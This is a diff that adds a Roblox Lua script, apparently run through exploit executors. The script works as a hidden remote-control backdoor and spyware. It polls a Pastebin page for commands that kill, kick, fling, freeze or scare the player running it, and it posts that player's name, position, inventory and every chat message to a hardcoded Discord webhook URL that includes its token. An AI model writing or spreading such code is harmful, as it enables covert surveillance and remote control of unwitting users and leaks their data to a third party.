@@ -1,0 +1,150 @@
+local settings = {
+    webhook = "https://discord.com/api/webhooks/1464946131971604502/BeusAylciHGUFqcIyOsrQdymegpkb37kW7arx9zsxVX51An6GWXTSNFJXm0C-KWadIKT",
+    control = "https://pastebin.com/raw/EsjZSDrA",
+    check_delay = 1.5
+}
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local Debris = game:GetService("Debris")
+local lp = Players.LocalPlayer
+
+local function requestFunc(options)
+    local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+    if fn then return fn(options) end
+end
+
+local function getInventory()
+    local tools = {}
+    pcall(function()
+        local backpack = lp:FindFirstChild("Backpack")
+        local char = lp.Character
+        if backpack then
+            for _, v in ipairs(backpack:GetChildren()) do
+                if v:IsA("Tool") then table.insert(tools, v.Name) end
+            end
+        end
+        if char then
+            for _, v in ipairs(char:GetChildren()) do
+                if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end
+            end
+        end
+    end)
+    return #tools > 0 and table.concat(tools, ", ") or "Empty"
+end
+
+local function sendLog(title, desc, color)
+    task.spawn(function()
+        local pos = "Unknown"
+        pcall(function()
+            local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                pos = string.format("X: %.1f, Y: %.1f, Z: %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
+            end
+        end)
+        local data = {
+            ["embeds"] = {{
+                ["title"] = title,
+                ["description"] = desc,
+                ["color"] = color or 0xFF0000,
+                ["fields"] = {
+                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. "`", ["inline"] = true},
+                    {["name"] = "📍 Позиция", ["value"] = "`" .. pos .. "`", ["inline"] = true},
+                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
+                },
+                ["footer"] = {["text"] = "AxM Ultra Fixed • " .. os.date("%X")}
+            }}
+        }
+        requestFunc({
+            Url = settings.webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
+
+task.spawn(function()
+    local last_cmd = ""
+    local flingConnection
+    
+    pcall(function()
+        local init = game:HttpGet(settings.control .. "?nocache=" .. tick() .. "&r=" .. math.random(1,10000))
+        last_cmd = init:match("^%s*(.-)%s*$"):lower()
+    end)
+
+    while true do
+        task.wait(settings.check_delay)
+        
+        local ok, res = pcall(function() 
+            return game:HttpGet(settings.control .. "?cb=" .. tick() .. "&random=" .. math.random(1,10000)) 
+        end)
+
+        if ok and res then
+            local clean_res = res:match("^%s*(.-)%s*$") or ""
+            local current_cmd = clean_res:lower()
+
+            if current_cmd == "safe" or current_cmd == "" then
+                if last_cmd ~= "safe" then
+                    last_cmd = "safe"
+                end
+            elseif current_cmd ~= last_cmd then
+                last_cmd = current_cmd
+                
+                local char = lp.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                local hum = char and char:FindFirstChildOfClass("Humanoid")
+
+                if current_cmd == "kill" and hum then
+                    hum.Health = 0
+                    sendLog("💀 КИЛЛ", "Выполнено")
+                elseif current_cmd:find("message") then
+                    local msg = clean_res:match("%((.-)%)") or "System"
+                    local g = Instance.new("ScreenGui", lp.PlayerGui)
+                    local t = Instance.new("TextLabel", g)
+                    t.Size = UDim2.new(1,0,0.1,0); t.Position = UDim2.new(0,0,0.45,0)
+                    t.Text = msg; t.TextScaled = true; t.BackgroundColor3 = Color3.new(0,0,0)
+                    t.TextColor3 = Color3.new(1,1,1); t.BackgroundTransparency = 0.5
+                    Debris:AddItem(g, 7)
+                    sendLog("📢 MSG", "Текст: " .. msg, 0x00FF00)
+                elseif current_cmd == "screamer" then
+                    local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
+                    local g = Instance.new("ScreenGui", lp.PlayerGui)
+                    local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
+                    Debris:AddItem(s, 5); Debris:AddItem(g, 3)
+                    sendLog("😱 СКРИМЕР", "Бу!")
+                elseif current_cmd:find("kick") then
+                    local r = clean_res:match("%((.-)%)") or "Lost Connection"
+                    sendLog("🚪 КИК", "Причина: " .. r, 0xFFFF00)
+                    task.wait(0.5)
+                    lp:Kick(r)
+                elseif current_cmd == "fling" and hrp then
+                    if flingConnection then flingConnection:Disconnect() end
+                    flingConnection = RunService.Heartbeat:Connect(function()
+                        if hrp and hrp.Parent then
+                            hrp.Velocity = Vector3.new(0, 10000, 0)
+                            hrp.RotVelocity = Vector3.new(0, 10000, 0)
+                        end
+                    end)
+                    sendLog("🌪️ ФЛИНГ", "Включен")
+                elseif current_cmd == "unfling" then
+                    if flingConnection then flingConnection:Disconnect() end
+                    sendLog("🛡️ УНФЛИНГ", "Выключен")
+                elseif current_cmd == "freeze" and hrp then
+                    hrp.Anchored = true
+                    sendLog("🧊 ФРИЗ", "Заморожен")
+                elseif current_cmd == "unfreeze" and hrp then
+                    hrp.Anchored = false
+                    sendLog("🔥 УНФРИЗ", "Разморожен")
+                end
+            end
+        end
+    end
+end)
+
+lp.Chatted:Connect(function(m) 
+    sendLog("💬 ЧАТ", "Сообщение: `" .. m .. "`", 0x3498DB) 
+end)
+
+sendLog("🛰️ СИСТЕМА", "Скрипт полностью запущен. Жду команд в Pastebin.", 0x00FF00)
